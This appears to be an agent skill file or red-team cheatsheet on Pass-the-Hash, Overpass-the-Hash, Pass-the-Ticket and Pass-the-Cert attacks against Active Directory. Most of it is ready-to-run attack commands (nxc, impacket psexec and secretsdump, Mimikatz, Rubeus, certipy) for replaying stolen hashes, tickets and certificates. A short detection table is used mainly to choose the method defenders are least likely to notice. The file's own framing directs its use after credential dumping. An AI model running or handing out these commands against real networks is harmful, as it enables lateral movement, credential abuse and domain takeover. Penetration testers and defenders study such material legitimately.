---
name: offensive-pass-the-x
description: "Pass-the-Hash (PtH), Pass-the-Ticket (PtT), Overpass-the-Hash (OPth), and Pass-the-Cert variants — replaying captured credential material as Kerberos / NTLM authentication without knowing the cleartext password. Use after credential dumping (LSASS, DCSync, kerberoast crack) to authenticate to additional resources."
---

# Pass-the-X

When you have credential material that isn't the cleartext password — NT hash, AES key, Kerberos ticket, or X.509 certificate — replay it as authentication.

## Pass-the-Hash (PtH) — NTLM

```bash
# Linux
nxc smb 10.0.0.0/24 -u admin -H <NThash> --local-auth   # local account
nxc smb 10.0.0.0/24 -u admin -H <NThash> -d corp.local  # domain
impacket-psexec corp/admin@target -hashes :<NThash>
impacket-wmiexec corp/admin@target -hashes :<NThash>
impacket-smbexec corp/admin@target -hashes :<NThash>
```

```powershell
# Windows — Mimikatz
sekurlsa::pth /user:admin /domain:corp.local /ntlm:<NThash> /run:cmd.exe
# Run the spawned cmd; uses PtH for outbound auth
```

NTLM-only protocols accept hashes directly. Modern Kerberos-preferred environments may reject NTLM auth — fall back to OPtH.

## Overpass-the-Hash (OPth)

Convert NT hash → TGT, then use Kerberos for authentication.

```powershell
Rubeus.exe asktgt /user:admin /rc4:<NThash> /domain:corp.local /ptt
# Now Kerberos tickets cached in current session

# Or for AES (modern, harder to detect than RC4)
Rubeus.exe asktgt /user:admin /aes256:<AES256> /domain:corp.local /ptt
```

```bash
# impacket — request TGT with NT hash
impacket-getTGT corp.local/admin -hashes :<NThash>
# Outputs admin.ccache; use with KRB5CCNAME

KRB5CCNAME=admin.ccache impacket-psexec -k -no-pass dc.corp.local
```

### Why OPth vs PtH

- Kerberos is preferred over NTLM in modern AD; some services NTLM-restricted
- RC4-encrypted Kerberos vs NTLM raw hash — different detection signatures
- Kerberos-only services accept tickets, not hashes

## Pass-the-Ticket (PtT)

Replay an existing Kerberos ticket.

```powershell
Rubeus.exe ptt /ticket:base64.kirbi
# Or from file
Rubeus.exe ptt /ticket:admin.kirbi

# List current session tickets
klist
```

```bash
# Linux — set environment to use ccache
KRB5CCNAME=admin.ccache impacket-secretsdump -k -no-pass dc.corp.local
```

### Ticket Sources

- `Rubeus.exe dump` — extract from current session memory
- `mimikatz.exe sekurlsa::tickets /export` — export from LSA cache
- `Rubeus.exe asktgt` — obtain via OPth
- `Rubeus.exe asktgs` — obtain a TGS for a specific service
- DCSync → forge tickets (Golden / Silver) — see `offensive-ticket-forgery`

## Pass-the-Cert (PtC)

X.509 certificates can authenticate to AD via PKINIT (Kerberos public-key extension). Useful when you have a cert but no password / hash (e.g., from ADCS abuse, smart card extraction).

```bash
# certipy auth — use cert to mint TGT
certipy auth -pfx user.pfx -dc-ip dc

# Or with Rubeus (Windows side)
Rubeus.exe asktgt /user:admin /certificate:user.pfx /password:<pfx-password> /ptt
```

After certipy auth, the NT hash and TGT are output (UnPAC-the-Hash).

## Pass-the-Key (AES key)

```powershell
Rubeus.exe asktgt /user:admin /aes256:<AES256> /domain:corp.local /ptt
```

AES keys are stored alongside NT hashes in modern AD (post-2008 R2). DCSync output includes both.

## Detection

| Signal | Defender View |
|---|---|
| RC4 Kerberos in modern AD | Anomaly — most clients use AES |
| TGT issued from unusual IP | DC event 4768 |
| PtH from non-domain-joined source | NTLM event log |
| Mimikatz signature in LSA | EDR alert |

OPth with AES is quietest. PtH directly is loudest. Always prefer OPth when NT hash is available.

## Engagement Cheatsheet

```bash
# Have NT hash? Try in priority order:
# 1. OPth to TGT
impacket-getTGT corp.local/admin -hashes :<NThash>

# 2. Use TGT
KRB5CCNAME=admin.ccache impacket-psexec -k -no-pass target

# Have ticket? PtT:
KRB5CCNAME=ticket.ccache impacket-...

# Have cert? PtC:
certipy auth -pfx user.pfx -dc-ip dc
# Output gives both NT hash and TGT for further pivoting
```

## Key References

- impacket suite documentation
- Rubeus: github.com/GhostPack/Rubeus
- "Tickets, Tickets, Tickets" (Will Schroeder)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/pass-the-x.md
